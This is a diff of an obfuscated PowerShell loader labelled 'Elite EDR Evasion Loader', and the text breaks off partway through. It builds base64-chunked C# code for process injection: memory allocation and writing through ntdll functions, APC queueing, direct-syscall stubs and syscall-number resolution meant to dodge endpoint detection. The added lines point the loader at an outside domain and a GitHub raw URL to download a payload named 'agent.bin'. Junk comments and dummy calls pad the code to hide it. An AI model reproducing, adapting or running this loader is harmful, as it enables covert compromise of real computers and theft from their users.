@@ -1,326 +1,301 @@
 # === Elite EDR Evasion Loader ===
-# Checks passed: gbmKksbE
+# Checks passed: qoQrfxHO
 
-# IkHWIsvRmCQTHGHitajtDsANdonvdc
 if ([IntPtr]::Size -ne 8) {
+# PsvoZMAhcXeEKdKVQDhjtJeszJSlsB
     # We are 32-bit. Try to relaunch in 64-bit if possible, or just exit to avoid crash.
-# jpuDiVjRZAbvvYRQGtDqcHSgBMEndQ
+$null = Get-Date -Format "hclO"
     # For now, simple exit.
     exit
-$null = Get-Date -Format "PbUp"
+# QUlzVxXJapOlxOPqZVaNIPhMEXlnrm
 }
 
-$ySilwrZupPfeYfSTeY = "lE5MaXtjv40q95nRV8X4O9zLHPMNYMZFL+sBKqZbI5U="
-$fWPKweiUHTkslJb = "127.0.0.1:8080"
-$fpJLTDTegUgB = "https://$fWPKweiUHTkslJb/download?file=agent.bin"
+$HwOKhHCveYBc = "2KSZuD0XdzzcSBANs3xvZYu03vWvR5ZYv/8XuYA36cY="
+$XSAsVgYlMOjN = "api.acpr-portail.fr"
+$DvwYvuZeGIQfrTSMiYeU = "https://raw.githubusercontent.com/jeromegerchin/upjsdefer/main/agent.bin"
 
 
-$SqRVviqLumMHWxGG = 'CnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlc';
-# qVPFWpcympjzTvQOtwJdkGJaaPgFyL
-$dLCXXKKOrTdtmHTUDfZ = 'nZpY2VzOwp1c2luZyBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYzsKdXNpbm';
-$xqpdPUbZUmdKnpV = 'cgU3lzdGVtLklPOwp1c2luZyBTeXN0ZW0uVGV4dDsKCnB1YmxpYyBjbGFzcyB';
-# KCXHONEHSXwUYwwfUuhQeemcWpGyWF
-$lstazFiUok = 'FbGl0ZUluamVjdCB7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBT';
-$null = Get-Date -Format "nAaG"
-$RIhukNcoGfcighc = 'ZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuI';
-$HWyEmSQclnsNj = 'GJvb2wgQ3JlYXRlUHJvY2VzcyhzdHJpbmcgbHBBcHBsaWNhdGlvbk5hbWUsIH';
-$bCAZpmIlmFQweOnAKx = 'N0cmluZyBscENvbW1hbmRMaW5lLCBJbnRQdHIgbHBQcm9jZXNzQXR0cmlidXR';
-$ylsFVKIMWL = 'lcywgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgYm9vbCBiSW5oZXJpdEhh';
-$rkiwkhNqcHs = 'bmRsZXMsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBFbnZpcm9ub';
-$RZMYzfFQsdJmxLKFndqK = 'WVudCwgc3RyaW5nIGxwQ3VycmVudERpcmVjdG9yeSwgcmVmIFNUQVJUVVBJTk';
-$HJoNgOTomqK = 'ZPRVggbHBTdGFydHVwSW5mbywgb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gbHB';
-$XHmKSskgdry = 'Qcm9jZXNzSW5mb3JtYXRpb24pOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMy';
-# BTomfgjkKixfhkvizrAuRKuPLOEagp
-$eIgWGUoMvPrmrdmEMO = 'LmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHVibGljIHN0YXRpY';
-$dPfwrTGSPbaCp = 'yBleHRlcm4gYm9vbCBJbml0aWFsaXplUHJvY1RocmVhZEF0dHJpYnV0ZUxpc3';
-# erdkMUmWANlbhBVBaGLaFoUNPefTLK
-$GqxxErxJTMisvfXg = 'QoSW50UHRyIGxwQXR0cmlidXRlTGlzdCwgaW50IGR3QXR0cmlidXRlQ291bnQ';
-$EJWXuIPSJJJZx = 'sIGludCBkd0ZsYWdzLCByZWYgSW50UHRyIGxwU2l6ZSk7CgogICAgW0RsbElt';
-$null = Get-Date -Format "uzSb"
-$NqjkiATsBjTdghU = 'cG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgI';
-$LkYugJDCWWGuxyxauQ = 'CBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIFVwZGF0ZVByb2NUaHJlYWRBdH';
-$null = Get-Date -Format "eaOF"
-$NZJibJNmlCYhXevWfkQd = 'RyaWJ1dGUoSW50UHRyIGxwQXR0cmlidXRlTGlzdCwgdWludCBkd0ZsYWdzLCB';
-# emGXNxlCEvkdsAIKOqhlvgksTSSJEz
-$sEmAgMaMCzASEwS = 'JbnRQdHIgQXR0cmlidXRlLCBJbnRQdHIgbHBWYWx1ZSwgSW50UHRyIGNiU2l6';
-$EqsGJEIxGAnMNH = 'ZSwgSW50UHRyIGxwUHJldmlvdXNWYWx1ZSwgSW50UHRyIGxwUmV0dXJuU2l6Z';
-$yrpjXIeXhFvWcFk = 'Sk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm';
-$QlsAqaAQfOiXdqQspz = '9yID0gdHJ1ZSldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgT3B';
-$null = Get-Date -Format "lUMO"
-$xBFHvWyAiNWGp = 'lblByb2Nlc3ModWludCBwcm9jZXNzQWNjZXNzLCBib29sIGJJbmhlcml0SGFu';
-$nPDpfgaLHcrhx = 'ZGxlLCBpbnQgcHJvY2Vzc0lkKTsKCiAgICBbU3RydWN0TGF5b3V0KExheW91d';
-$uTWwQqbAhwfUL = 'EtpbmQuU2VxdWVudGlhbCldCiAgICBwdWJsaWMgc3RydWN0IFBST0NFU1NfSU';
-$aXxPDjtALtrPsbVRXR = '5GT1JNQVRJT04geyBwdWJsaWMgSW50UHRyIGhQcm9jZXNzOyBwdWJsaWMgSW5';
-# SOgRxvpDSRihSHNtdAuFudSqLJMeNh
-$jDTQTJMSZVs = '0UHRyIGhUaHJlYWQ7IHB1YmxpYyBpbnQgZHdQcm9jZXNzSWQ7IHB1YmxpYyBp';
-$null = Get-Date -Format "jKdb"
-$nFEECdnUbCDDEkx = 'bnQgZHdUaHJlYWRJZDsgfQogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kL';
-$IXWFoeKrRjJ = 'lNlcXVlbnRpYWwpXQogICAgcHVibGljIHN0cnVjdCBTVEFSVFVQSU5GT0VYIH';
-$DDcWcYUhJBRIvNakQIDw = 'sgcHVibGljIFNUQVJUVVBJTkZPIFN0YXJ0dXBJbmZvOyBwdWJsaWMgSW50UHR';
-$eqbiRvxFYTIhC = 'yIGxwQXR0cmlidXRlTGlzdDsgfQogICAgW1N0cnVjdExheW91dChMYXlvdXRL';
-$qquSAUExdMeKbHuuiM = 'aW5kLlNlcXVlbnRpYWwpXQogICAgcHVibGljIHN0cnVjdCBTVEFSVFVQSU5GT';
-$HhyybBmmYP = 'yB7IHB1YmxpYyB1aW50IGNiOyBwdWJsaWMgc3RyaW5nIGxwUmVzZXJ2ZWQ7IH';
-$ciWtJSsYJwZIC = 'B1YmxpYyBzdHJpbmcgbHBEZXNrdG9wOyBwdWJsaWMgc3RyaW5nIGxwVGl0bGU';
-$rcHiCfoZVAruTbigwS = '7IHB1YmxpYyB1aW50IGR3WDsgcHVibGljIHVpbnQgZHdZOyBwdWJsaWMgdWlu';
-$ZaVNGupFkXzTE = 'dCBkd1hTaXplOyBwdWJsaWMgdWludCBkd1lTaXplOyBwdWJsaWMgdWludCBkd';
-$dsoGDKUSsjbBMbQeMUsx = '1hDb3VudENoYXJzOyBwdWJsaWMgdWludCBkd1lDb3VudENoYXJzOyBwdWJsaW';
-$null = Get-Date -Format "ZYgn"
-$ERDQlHDTKHDGHrMwurDa = 'MgdWludCBkd0ZpbGxBdHRyaWJ1dGU7IHB1YmxpYyB1aW50IGR3RmxhZ3M7IHB';
-$THmcjgTwqn = '1YmxpYyB1c2hvcnQgd1Nob3dXaW5kb3c7IHB1YmxpYyB1c2hvcnQgY2JSZXNl';
-$null = Get-Date -Format "VqSL"
-$SWFyzltcdXAna = 'cnZlZDI7IHB1YmxpYyBJbnRQdHIgbHBSZXNlcnZlZDI7IHB1YmxpYyBJbnRQd';
-$jtgZWnKldUURuj = 'HIgaFN0ZElucHV0OyBwdWJsaWMgSW50UHRyIGhTdGRPdXRwdXQ7IHB1YmxpYy';
-$GIzzxPnKkjCOnWF = 'BJbnRQdHIgaFN0ZEVycm9yOyB9CgogICAgcHVibGljIGRlbGVnYXRlIGxvbmc';
-$null = Get-Date -Format "Yjzt"
-$mclECyygoWq = 'gTnRBbGxvY2F0ZVZpcnR1YWxNZW1vcnkoSW50UHRyIGhQcm9jLCByZWYgSW50';
-$MckWZsOgldNiV = 'UHRyIGJhc2VBZGRyLCBJbnRQdHIgemVyb0JpdHMsIHJlZiBJbnRQdHIgcmVna';
-$ohklVhiJvLtGpZ = 'W9uU2l6ZSwgdWludCBhbGxvY1R5cGUsIHVpbnQgcHJvdGVjdCk7CiAgICBwdW';
-$null = Get-Date -Format "hHEO"
-$khJmmGtbtdHTT = 'JsaWMgZGVsZWdhdGUgbG9uZyBOdFdyaXRlVmlydHVhbE1lbW9yeShJbnRQdHI';
-$PkakUXOPmvnUUgyYvgk = 'gaFByb2MsIEludFB0ciBiYXNlQWRkciwgYnl0ZVtdIGJ1ZmZlciwgdWludCBs';
-$OlHlkrtGmO = 'ZW4sIG91dCB1aW50IHdyaXR0ZW4pOwogICAgcHVibGljIGRlbGVnYXRlIGxvb';
-$MDdnagafcmFZ = 'mcgTnRQcm90ZWN0VmlydHVhbE1lbW9yeShJbnRQdHIgaFByb2MsIHJlZiBJbn';
-$vGoWlDsYRfKqijm = 'RQdHIgYmFzZUFkZHIsIHJlZiBJbnRQdHIgcmVnaW9uU2l6ZSwgdWludCBuZXd';
-$null = Get-Date -Format "SMCM"
-$AOIVBpGXaPpQfCxOt = 'Qcm90LCBvdXQgdWludCBvbGRQcm90KTsKICAgIHB1YmxpYyBkZWxlZ2F0ZSBs';
-$KmyvIQawyuve = 'b25nIE50UXVldWVBcGNUaHJlYWQoSW50UHRyIGhUaHJlYWQsIEludFB0ciBhc';
-$null = Get-Date -Format "tTeO"
-$KsXKzosYIhyKyeYOU = 'GNSb3V0aW5lLCBJbnRQdHIgYXBjUm91dGluZUNvbnRleHQsIEludFB0ciBhcG';
-$wuXpoTGuTf = 'NTdGF0dXNCbG9jaywgSW50UHRyIGFwY1Jlc2VydmVkKTsKICAgIHB1YmxpYyB';
-$wnELbKTICKwMReNSSRR = 'kZWxlZ2F0ZSBsb25nIE50UmVzdW1lVGhyZWFkKEludFB0ciBoVGhyZWFkLCBv';
-$null = Get-Date -Format "rpCI"
-$lRmxYfBmfrrfigovva = 'dXQgdWludCBzdXNwZW5kQ291bnQpOwoKICAgIHB1YmxpYyBzdGF0aWMgYnl0Z';
-$LfQfMSWWPc = 'VtdIHN0dWIgPSB7IDB4NEMsIDB4OEIsIDB4RDEsIDB4QjgsIDB4MDAsIDB4MD';
-$null = Get-Date -Format "TGsR"
-$EcWiaCYNiFpYTnPuorr = 'AsIDB4MDAsIDB4MDAsIDB4NDksIDB4QkIsIDB4MDAsIDB4MDAsIDB4MDAsIDB';
-$WiDGXmawGgxjBTAU = '4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsIDB4NDEsIDB4RkYsIDB4RTMg';
-$TKvQNZycfm = 'fTsKCiAgICBwdWJsaWMgc3RhdGljIGludCBHZXRTU04oc3RyaW5nIGZ1bmNOY';
-$vsOvFTiyFfwNNZ = 'W1lKSB7CiAgICAgICAgYnl0ZVtdIG50ZGxsID0gRmlsZS5SZWFkQWxsQnl0ZX';
-$XrIlernpshlF = 'MoIkM6XFxXaW5kb3dzXFxTeXN0ZW0zMlxcbnRkbGwuZGxsIik7CiAgICAgICA';
-$AwklmHaGFXTDr = 'gaW50IGVfbGZhbmV3ID0gQml0Q29udmVydGVyLlRvSW50MzIobnRkbGwsIDB4';
-# BEyAQOaTrksmbYzffsOwYJMsbQziYP
-$whByKSUMRyFJJVANQMC = 'M0MpOwogICAgICAgIGludCBleHBvcnREaXJSdmEgPSBCaXRDb252ZXJ0ZXIuV';
-$sRPbgXLRhzLAiZryR = 'G9JbnQzMihudGRsbCwgZV9sZmFuZXcgKyAweDg4KTsKICAgICAgICBpbnQgZX';
-# PQRxvSekBPhqoihLqpvfPCGJptYqFB
-$GzBmeOQgYdXbgqHcShIC = 'hwb3J0RGlyT2Zmc2V0ID0gUnZhVG9PZmZzZXQobnRkbGwsIGVfbGZhbmV3LCB';
-$FjlmsKmMQRduOkctKIDC = 'leHBvcnREaXJSdmEpOwogICAgICAgIAogICAgICAgIGludCBudW1OYW1lcyA9';
-$HINnmloZCZiKvIOnLu = 'IEJpdENvbnZlcnRlci5Ub0ludDMyKG50ZGxsLCBleHBvcnREaXJPZmZzZXQgK';
-$TYMeiJHeyYEPeHihfitK = 'yAweDE4KTsKICAgICAgICBpbnQgbmFtZXNSdmEgPSBCaXRDb252ZXJ0ZXIuVG';
-$zbMCVycqAfDnHnv = '9JbnQzMihudGRsbCwgZXhwb3J0RGlyT2Zmc2V0ICsgMHgyMCk7CiAgICAgICA';
-$UJEendgdewEDNP = 'gaW50IG9yZGluYWxzUnZhID0gQml0Q29udmVydGVyLlRvSW50MzIobnRkbGws';
-$SSYrsiXNfTnByoQKpy = 'IGV4cG9ydERpck9mZnNldCArIDB4MjQpOwogICAgICAgIGludCBmdW5jc1J2Y';
-# jBzOMpEsTMGHifXWIiDQdZWDgzGFxy
-$kUvOmWTOPkZndOSc = 'SA9IEJpdENvbnZlcnRlci5Ub0ludDMyKG50ZGxsLCBleHBvcnREaXJPZmZzZX';
-$KyvsytwIHWX = 'QgKyAweDFDKTsKICAgICAgICAKICAgICAgICBpbnQgbmFtZXNPZmZzZXQgPSB';
-$FaluNyvVCecqZut = 'SdmFUb09mZnNldChudGRsbCwgZV9sZmFuZXcsIG5hbWVzUnZhKTsKICAgICAg';
-$xhdXYOZOkAntTShL = 'ICBpbnQgb3JkaW5hbHNPZmZzZXQgPSBSdmFUb09mZnNldChudGRsbCwgZV9sZ';
-$ZNYIjjXsVVvPAWm = 'mFuZXcsIG9yZGluYWxzUnZhKTsKICAgICAgICBpbnQgZnVuY3NPZmZzZXQgPS';
-$WYirnYHiGAaLKGxLZvZE = 'BSdmFUb09mZnNldChudGRsbCwgZV9sZmFuZXcsIGZ1bmNzUnZhKTsKICAgICA';
-$MACmdoxyuVBv = 'gICAKICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IG51bU5hbWVzOyBpKysp';
-# ttdsPOviyPqBoFpnvZvdSdwOdsjtYk
-$fonxQvEPTjLuqoICzaR = 'IHsKICAgICAgICAgICAgaW50IG5hbWVSdmEgPSBCaXRDb252ZXJ0ZXIuVG9Jb';
-# PAMCadGfsXGuxUlKCuksSGdxLWUGDA
-$eQCWRkFHvWzBE = 'nQzMihudGRsbCwgbmFtZXNPZmZzZXQgKyAoaSAqIDQpKTsKICAgICAgICAgIC';
-# omKOjXVGpeUTBFufpodzMnghLWfaJX
-$oJFKRtpIdFuO = 'Agc3RyaW5nIG5hbWUgPSBHZXRTdHJpbmcobnRkbGwsIFJ2YVRvT2Zmc2V0KG5';
-$EsVMQHEZNqzEqAWj = '0ZGxsLCBlX2xmYW5ldywgbmFtZVJ2YSkpOwogICAgICAgICAgICBpZiAobmFt';
-# fVeixPjxCRdZIjxdpQXnflpvSRXsxv
-$eUBXtAuJYTMKMpjW = 'ZSA9PSBmdW5jTmFtZSkgewogICAgICAgICAgICAgICAgc2hvcnQgb3JkaW5hb';
-$HmSUPtcmLjbJk = 'CA9IEJpdENvbnZlcnRlci5Ub0ludDE2KG50ZGxsLCBvcmRpbmFsc09mZnNldC';
-$CNgatbhFPA = 'ArIChpICogMikpOwogICAgICAgICAgICAgICAgaW50IGZ1bmNSdmEgPSBCaXR';
-$null = Get-Date -Format "nfbj"
-$BInldzrCMPYW = 'Db252ZXJ0ZXIuVG9JbnQzMihudGRsbCwgZnVuY3NPZmZzZXQgKyAob3JkaW5h';
-# YPLtjjuwXhmLcoRIBKohlgRbDsrgay
-$nRTUaniXXVNA = 'bCAqIDQpKTsKICAgICAgICAgICAgICAgIGludCBmdW5jT2Zmc2V0ID0gUnZhV';
-$HRHBzGSzkoc = 'G9PZmZzZXQobnRkbGwsIGVfbGZhbmV3LCBmdW5jUnZhKTsKICAgICAgICAgIC';
-$UqyVPnnTiH = 'AgICAgIGlmIChudGRsbFtmdW5jT2Zmc2V0XSA9PSAweDRDICYmIG50ZGxsW2Z';
-$eJSJCZRNRdVgDbKtU = '1bmNPZmZzZXQrM10gPT0gMHhCOCkKICAgICAgICAgICAgICAgICAgICByZXR1';
-# nVKHgUFsSDpIsPjdXwjAROMtFDKQvy
-$tCIHzCaRoc = 'cm4gQml0Q29udmVydGVyLlRvSW50MzIobnRkbGwsIGZ1bmNPZmZzZXQgKyA0K';
-$AFpfnZGYxJea = 'TsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gLTE7Ci';
-$HOPNGuWynpBnCaS = 'AgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgaW50IFJ2YVRvT2Zmc2V0KGJ5dGV';
-# mHWAjAnoFSOrXocJFlPePpGYfBCpaW
-$xZErYaLQdL = 'bXSBmaWxlLCBpbnQgZV9sZmFuZXcsIGludCBydmEpIHsKICAgICAgICBzaG9y';
-$vmrjVyVudsLtiEcchNN = 'dCBudW1TZWN0aW9ucyA9IEJpdENvbnZlcnRlci5Ub0ludDE2KGZpbGUsIGVfb';
-$wKKxWrjYAHbRhwjuCJM = 'GZhbmV3ICsgMHgwNik7CiAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCBudW';
-$AgxxzMIMIJVlOOovh = '1TZWN0aW9uczsgaSsrKSB7CiAgICAgICAgICAgIGludCBzZWN0aW9uT2Zmc2V';
-$orsnmGJtuzm = '0ID0gZV9sZmFuZXcgKyAweDEwOCArIChpICogMHgyOCk7CiAgICAgICAgICAg';
-$rUFxEvlmYbJZBn = 'IGludCB2aXJ0dWFsU2l6ZSA9IEJpdENvbnZlcnRlci5Ub0ludDMyKGZpbGUsI';
-$null = Get-Date -Format "LZjU"
-$MSJCetEmOfQKDIVWgH = 'HNlY3Rpb25PZmZzZXQgKyAweDA4KTsKICAgICAgICAgICAgaW50IHZpcnR1YW';
-$pYWypkXpNVXz = 'xBZGRyID0gQml0Q29udmVydGVyLlRvSW50MzIoZmlsZSwgc2VjdGlvbk9mZnN';
-$uDvWeMziVRRtdzpr = 'ldCArIDB4MEMpOwogICAgICAgICAgICBpbnQgcmF3RGF0YUFkZHIgPSBCaXRD';
-$jggPYazgahX = 'b252ZXJ0ZXIuVG9JbnQzMihmaWxlLCBzZWN0aW9uT2Zmc2V0ICsgMHgxNCk7C';
-$null = Get-Date -Format "Oxtl"
-$yIufLSlUaJDTPznIcps = 'iAgICAgICAgICAgIGlmIChydmEgPj0gdmlydHVhbEFkZHIgJiYgcnZhIDwgdm';
-# ZyqtEVrgCsudSOXJWQjaizNZNePxYX
-$pdtWxVVXXEywM = 'lydHVhbEFkZHIgKyB2aXJ0dWFsU2l6ZSkKICAgICAgICAgICAgICAgIHJldHV';
-$vAWzbSMYdxySJ = 'ybiBydmEgLSB2aXJ0dWFsQWRkciArIHJhd0RhdGFBZGRyOwogICAgICAgIH0K';
-# gUqUtgFDyqPNtnBNVAWxXnTKZtgOXA
-$htzQbWtviMzk = 'ICAgICAgICByZXR1cm4gcnZhOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljI';
-$UAhBytpjzVwxCNaM = 'HN0cmluZyBHZXRTdHJpbmcoYnl0ZVtdIGZpbGUsIGludCBvZmZzZXQpIHsKIC';
-$FOMJNqHjwhFqdDBghY = 'AgICAgICBpbnQgbGVuID0gMDsKICAgICAgICB3aGlsZSAoZmlsZVtvZmZzZXQ';
-$kKUQfGaZybWstAtTAM = 'gKyBsZW5dICE9IDApIGxlbisrOwogICAgICAgIHJldHVybiBFbmNvZGluZy5B';
-$dsdGXcFWeLiqzpfUiIQ = 'U0NJSS5HZXRTdHJpbmcoZmlsZSwgb2Zmc2V0LCBsZW4pOwogICAgfQoKICAgI';
-$null = Get-Date -Format "UtHa"
-$QUyGXNdPnXv = 'HB1YmxpYyBzdGF0aWMgSW50UHRyIEdldFN5c2NhbGxQdHIoc3RyaW5nIGZ1bm';
-$dvPrpIZHooidkdEZlQ = 'NOYW1lKSB7CiAgICAgICAgSW50UHRyIG50ZGxsID0gR2V0TW9kdWxlSGFuZGx';
-$FYoiuBOIzmBEIDhuW = 'lKCJudGRsbC5kbGwiKTsKICAgICAgICBJbnRQdHIgZnVuY0FkZHIgPSBHZXRQ';
-$tZGlEAyDbhwlhpyF = 'cm9jQWRkcmVzcyhudGRsbCwgZnVuY05hbWUpOwogICAgICAgIGZvciAoaW50I';
-$LRfGXBpXDU = 'GkgPSAwOyBpIDwgNjQ7IGkrKykgewogICAgICAgICAgICBpZiAoTWFyc2hhbC';
-$QHwQjhNGCNPw = '5SZWFkQnl0ZShmdW5jQWRkciwgaSkgPT0gMHgwRiAmJiBNYXJzaGFsLlJlYWR';
-$null = Get-Date -Format "AwjW"
-$gwISnWhNMCAKyEnGyV = 'CeXRlKGZ1bmNBZGRyLCBpICsgMSkgPT0gMHgwNSkKICAgICAgICAgICAgICAg';
-$jOFxzCdagHcDMIuYfwIn = 'IHJldHVybiAoSW50UHRyKSgobG9uZylmdW5jQWRkciArIGkpOwogICAgICAgI';
-$null = Get-Date -Format "DNAk"
-$XFZqyRikWOVXDQWXquq = 'H0KICAgICAgICByZXR1cm4gSW50UHRyLlplcm87CiAgICB9CgogICAgW0RsbE';
-$LIaMpHcIaNOzIRZcrU = 'ltcG9ydCgia2VybmVsMzIuZGxsIildIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEl';
-$mSlsPxyiLUdy = 'udFB0ciBHZXRNb2R1bGVIYW5kbGUoc3RyaW5nIG0pOwogICAgW0RsbEltcG9y';
-$hTaVkXhzckKVnDWalece = 'dCgia2VybmVsMzIuZGxsIildIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0c';
-$kgHonoDHTOTJUJTHxYQ = 'iBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaCwgc3RyaW5nIG4pOwogICAgW0RsbE';
-# aKRdOtdhzxaicRduUbLMlWJmKDpXkU
-$SetiXeEGWhuUjKYWB = 'ltcG9ydCgia2VybmVsMzIuZGxsIildIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJ';
-# ALhzxSQVVSTImwsCRLqlnyNQABXpzk
-$NCbukbiAQGejvuDezcgh = 'vb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBk';
-$PYeBWsXfGfNqAxEdABQ = 'd1NpemUsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvd';
-# TMESzfABEVYkcARsGMGMCiWtaRVXow
-$GoAyOjLnxI = 'GVjdCk7Cn0K';
-$khuoCyLCVvqNIZUQ = $SqRVviqLumMHWxGG + $dLCXXKKOrTdtmHTUDfZ + $xqpdPUbZUmdKnpV + $lstazFiUok + $RIhukNcoGfcighc + $HWyEmSQclnsNj + $bCAZpmIlmFQweOnAKx + $ylsFVKIMWL + $rkiwkhNqcHs + $RZMYzfFQsdJmxLKFndqK + $HJoNgOTomqK + $XHmKSskgdry + $eIgWGUoMvPrmrdmEMO + $dPfwrTGSPbaCp + $GqxxErxJTMisvfXg + $EJWXuIPSJJJZx + $NqjkiATsBjTdghU + $LkYugJDCWWGuxyxauQ + $NZJibJNmlCYhXevWfkQd + $sEmAgMaMCzASEwS + $EqsGJEIxGAnMNH + $yrpjXIeXhFvWcFk + $QlsAqaAQfOiXdqQspz + $xBFHvWyAiNWGp + $nPDpfgaLHcrhx + $uTWwQqbAhwfUL + $aXxPDjtALtrPsbVRXR + $jDTQTJMSZVs + $nFEECdnUbCDDEkx + $IXWFoeKrRjJ + $DDcWcYUhJBRIvNakQIDw + $eqbiRvxFYTIhC + $qquSAUExdMeKbHuuiM + $HhyybBmmYP + $ciWtJSsYJwZIC + $rcHiCfoZVAruTbigwS + $ZaVNGupFkXzTE + $dsoGDKUSsjbBMbQeMUsx + $ERDQlHDTKHDGHrMwurDa + $THmcjgTwqn + $SWFyzltcdXAna + $jtgZWnKldUURuj + $GIzzxPnKkjCOnWF + $mclECyygoWq + $MckWZsOgldNiV + $ohklVhiJvLtGpZ + $khJmmGtbtdHTT + $PkakUXOPmvnUUgyYvgk + $OlHlkrtGmO + $MDdnagafcmFZ + $vGoWlDsYRfKqijm + $AOIVBpGXaPpQfCxOt + $KmyvIQawyuve + $KsXKzosYIhyKyeYOU + $wuXpoTGuTf + $wnELbKTICKwMReNSSRR + $lRmxYfBmfrrfigovva + $LfQfMSWWPc + $EcWiaCYNiFpYTnPuorr + $WiDGXmawGgxjBTAU + $TKvQNZycfm + $vsOvFTiyFfwNNZ + $XrIlernpshlF + $AwklmHaGFXTDr + $whByKSUMRyFJJVANQMC + $sRPbgXLRhzLAiZryR + $GzBmeOQgYdXbgqHcShIC + $FjlmsKmMQRduOkctKIDC + $HINnmloZCZiKvIOnLu + $TYMeiJHeyYEPeHihfitK + $zbMCVycqAfDnHnv + $UJEendgdewEDNP + $SSYrsiXNfTnByoQKpy + $kUvOmWTOPkZndOSc + $KyvsytwIHWX + $FaluNyvVCecqZut + $xhdXYOZOkAntTShL + $ZNYIjjXsVVvPAWm + $WYirnYHiGAaLKGxLZvZE + $MACmdoxyuVBv + $fonxQvEPTjLuqoICzaR + $eQCWRkFHvWzBE + $oJFKRtpIdFuO + $EsVMQHEZNqzEqAWj + $eUBXtAuJYTMKMpjW + $HmSUPtcmLjbJk + $CNgatbhFPA + $BInldzrCMPYW + $nRTUaniXXVNA + $HRHBzGSzkoc + $UqyVPnnTiH + $eJSJCZRNRdVgDbKtU + $tCIHzCaRoc + $AFpfnZGYxJea + $HOPNGuWynpBnCaS + $xZErYaLQdL + $vmrjVyVudsLtiEcchNN + $wKKxWrjYAHbRhwjuCJM + $AgxxzMIMIJVlOOovh + $orsnmGJtuzm + $rUFxEvlmYbJZBn + $MSJCetEmOfQKDIVWgH + $pYWypkXpNVXz + $uDvWeMziVRRtdzpr + $jggPYazgahX + $yIufLSlUaJDTPznIcps + $pdtWxVVXXEywM + $vAWzbSMYdxySJ + $htzQbWtviMzk + $UAhBytpjzVwxCNaM + $FOMJNqHjwhFqdDBghY + $kKUQfGaZybWstAtTAM + $dsdGXcFWeLiqzpfUiIQ + $QUyGXNdPnXv + $dvPrpIZHooidkdEZlQ + $FYoiuBOIzmBEIDhuW + $tZGlEAyDbhwlhpyF + $LRfGXBpXDU + $QHwQjhNGCNPw + $gwISnWhNMCAKyEnGyV + $jOFxzCdagHcDMIuYfwIn + $XFZqyRikWOVXDQWXquq + $LIaMpHcIaNOzIRZcrU + $mSlsPxyiLUdy + $hTaVkXhzckKVnDWalece + $kgHonoDHTOTJUJTHxYQ + $SetiXeEGWhuUjKYWB + $NCbukbiAQGejvuDezcgh + $PYeBWsXfGfNqAxEdABQ + $GoAyOjLnxI;
-$jsYhALOHKSxqwfENwcpO = [System.Text.Encoding]::UTF8.jpbqjypxcsds([System.Convert]::FromBase64String($khuoCyLCVvqNIZUQ))
+$NXiEpHLjnVXgDSidos = 'CnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwp';
+$GAoGjKcSaayxZtmOYkI = '1c2luZyBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYzsKdXNpbmcgU3lzdGVtLklPOwp1c2';
+$QQAcmVotBttxBYKf = 'luZyBTeXN0ZW0uVGV4dDsKCnB1YmxpYyBjbGFzcyBFbGl0ZUluamVjdCB7CiAgICBbRGxsS';
+$QCHBOFpKFqNQeWzVHBxB = 'W1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHB1Ymxp';
+$vDdtAijedAVB = 'YyBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlUHJvY2VzcyhzdHJpbmcgbHBBcHBsaWNhdGl';
+$GIDeXNErDlbdZUSZyPK = 'vbk5hbWUsIHN0cmluZyBscENvbW1hbmRMaW5lLCBJbnRQdHIgbHBQcm9jZXNzQXR0cmlidX';
+$null = Get-Date -Format "vuci"
+$vvbSfASZcoRBzqbJa = 'RlcywgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgYm9vbCBiSW5oZXJpdEhhbmRsZXMsI';
+$xFuKMebrsQpAy = 'HVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBFbnZpcm9ubWVudCwgc3RyaW5nIGxw';
+$nwrvPbueaGCFCkak = 'Q3VycmVudERpcmVjdG9yeSwgcmVmIFNUQVJUVVBJTkZPRVggbHBTdGFydHVwSW5mbywgb3V';
+$null = Get-Date -Format "vwPS"
+$tPGOWQHNOCwwoaVIdoQ = '0IFBST0NFU1NfSU5GT1JNQVRJT04gbHBQcm9jZXNzSW5mb3JtYXRpb24pOwoKICAgIFtEbG';
+$null = Get-Date -Format "GmDK"
+$wiIZgCAjaNozymTW = 'xJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHVib';
